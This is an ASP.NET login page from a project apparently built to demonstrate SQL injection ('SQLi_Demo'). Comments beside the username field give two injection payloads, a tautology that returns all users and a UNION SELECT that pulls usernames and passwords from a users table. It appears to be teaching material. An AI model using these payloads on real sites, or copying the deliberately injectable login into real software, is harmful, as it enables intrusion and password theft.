<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="WebForm1.aspx.cs" Inherits="SQLi_Demo.WebForm1" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Label ID="lbl_username" Text="Username: " runat="server"></asp:Label> 
            <asp:TextBox ID="txt_username" runat="server"></asp:TextBox><br /><br />
            <!-- SIMPLE SQL TO GET ALL USERS: ' or '1'='1 -->
            <!-- ADVANCED SQL TO GET PASSWORDS: ' or '1'='1'  union all select password, username from users where username='' or '1'='1 -->
            
            <asp:Label ID="lbl_password" Text="Password: " runat="server"></asp:Label> 
            <asp:TextBox ID="txt_password" runat="server" TextMode="Password"></asp:TextBox><br /><br />
            <asp:Button ID="cmd_Login" runat="server" Text="Login" OnClick="Cmd_Login_Click" />
        </div>
        <div>
            <asp:Label ID="lbl_Welcome" Text="Welcome: " runat="server" Visible="false"></asp:Label>
            <br /><br />
            <asp:LinkButton ID="btn_Logout" Text="Logout" runat="server" Visible="false" OnClick="btn_Logout_Click"></asp:LinkButton>
        </div>
    </form>
</body>
</html>
